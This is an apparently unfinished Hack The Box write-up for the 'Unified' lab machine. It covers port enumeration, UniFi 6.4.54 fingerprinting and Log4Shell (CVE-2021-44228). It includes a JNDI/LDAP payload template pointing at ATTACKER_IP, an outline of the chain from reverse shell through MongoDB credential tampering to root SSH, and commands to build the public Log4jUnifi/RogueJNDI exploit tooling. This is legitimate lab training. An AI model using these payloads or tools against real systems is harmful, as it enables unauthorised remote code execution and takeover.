# ⭐ Hack The Box - Unified ⭐

![HTB](https://img.shields.io/badge/HTB-Unified-success)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Category](https://img.shields.io/badge/Category-Log4Shell_MongoDB-red)


---

## Machine Information

| Property | Value |
|----------|-------|
| **Machine** | Unified |
| **Difficulty** | Easy |
| **OS** | Linux |
| **IP** | `10.129.96.149` |
| **Main Service** | UniFi Network |
| **Version** | 6.4.54 |
| **Vulnerability** | CVE-2021-44228 |
| **Vulnerability Name** | Log4Shell |
| **Database** | MongoDB |
| **Database Port** | 27117 |
| **Initial Access** | Remote Code Execution |
| **Privilege Escalation** | Credential manipulation + SSH |
| **Status** | ✅ Complete |

---

# Overview

Unified is a Linux machine based on the **UniFi Network Application**.

The attack starts with network enumeration, where port `8443` exposes the UniFi management interface. The application is identified as **UniFi Network 6.4.54**, which is vulnerable to **CVE-2021-44228 (Log4Shell)**.

By exploiting the Log4Shell vulnerability through a JNDI/LDAP payload, it is possible to obtain a reverse shell as the `unifi` user.

Once inside the system, MongoDB is discovered running locally on port `27117`. The `ace` database contains UniFi user information, including password hashes.

The administrator's credentials can be modified through MongoDB. After logging into the UniFi administration panel with the modified credentials, the **Device Authentication** section reveals credentials that can be used to connect to the machine via SSH as `root`.

### Attack Chain

```text
┌──────────────────────┐
│      Nmap Scan       │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ UniFi Network 6.4.54 │
│      Port 8443       │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ CVE-2021-44228       │
│     Log4Shell        │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│    JNDI → LDAP       │
│     RogueJNDI        │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ Remote Code Execution│
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ Reverse Shell        │
│      unifi           │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ MongoDB :27117       │
│ Database: ace        │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ Modify Administrator │
│     Credentials      │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ UniFi Web Panel      │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ Device Authentication│
│     Credentials      │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ SSH → root           │
└──────────┬───────────┘
           │
           ▼
       ROOT FLAG
```

# 1. Enumeration

The first step is to identify all open TCP ports.

```bash
sudo nmap -sS -p- --min-rate 5000 -Pn 10.129.96.149
```

The scan reveals:

```
PORT     STATE SERVICE
22/tcp   open  ssh
6789/tcp open  ibm-db2-admin
8080/tcp open  http-proxy
8443/tcp open  https-alt
8843/tcp open  unknown
8880/tcp open  cddbp-alt
```

The first four open ports are:

```
22, 6789, 8080, 8443
```

The most interesting service is port 8443, which appears to host a web application.

# 2. Identifying the Application

Opening the following URL in a browser:

```
https://10.129.96.149:8443
```

reveals the UniFi login interface.

The exact application title can also be confirmed from the terminal:

```
curl -k -L https://10.129.96.149:8443 | grep -i "<title>"
```

The response contains:
```
<title>UniFi Network</title>
```
# 3. Identifying the Version

The application version can be identified from the UniFi interface:
```
UniFi Network 6.4.54
```

This is important because the version is affected by a well-known vulnerability in Apache Log4j.

# 4. Identifying the Vulnerability

The vulnerability affecting this version is:
```
CVE-2021-44228
```

This is the well-known Log4Shell vulnerability.

Log4Shell affects vulnerable versions of Apache Log4j and can allow remote code execution through specially crafted JNDI lookup strings.

The basic concept is:

```
Attacker
   │
   │ Malicious JNDI string
   ▼
UniFi Network
   │
   │ Log4j processes the string
   ▼
JNDI
   │
   ▼
LDAP Server
   │
   ▼
Malicious Java Payload
   │
   ▼
Remote Code Execution
```

The vulnerability is associated with:

CVE: CVE-2021-44228
Name: Log4Shell
Type: Remote Code Execution (RCE)
MITRE ATT&CK: T1190 - Exploit Public-Facing Application
OWASP: A06:2021 - Vulnerable and Outdated Components

# 5. Understanding JNDI

The next question asks:

What protocol does JNDI leverage in the injection?

The answer is:
```
LDAP
```

JNDI (Java Naming and Directory Interface) can use LDAP to retrieve remote objects.

In this attack, the payload follows this general structure:
```
${jndi:ldap://ATTACKER_IP:1389/RESOURCE}
```
The vulnerable application processes the JNDI lookup and connects back to the attacker's LDAP server.

# 6. Log4jUnifi

Instead of manually building every part of the exploit, I used the following project:

Log4jUnifi
```
https://github.com/puzzlepeaches/Log4jUnifi
```

The repository automates the exploitation process using a malicious JNDI server and prepares the payload required to obtain a reverse shell.

Clone the repository:
```
git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi
```
Then:
```
cd Log4jUnifi
```
The repository contains:
```
Log4jUnifi
├── Dockerfile
├── exploit.py
├── README.md
├── requirements.txt
└── utils
    └── rogue-jndi
```
# 7. Compiling RogueJNDI

The exploit requires the RogueJNDI component to be compiled.

First, install Maven if necessary:
```
sudo apt update
sudo apt install maven
```
Then check:
```
mvn -version
```
From the root of the Log4jUnifi repository:
```
mvn package -f utils/rogue-jndi/
```
Initially, the rogue-jndi directory was empty because the repository had not been cloned with its submodules.

The correct cloning method is:
```
git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi
```
After cloning the submodule correctly, the build produced:
```
utils/rogue-jndi/target/
├── classes
├── generated-sources
├── maven-archiver
├── maven-status
├── original-RogueJndi-1.1.jar
└── RogueJndi-1.1.jar
```

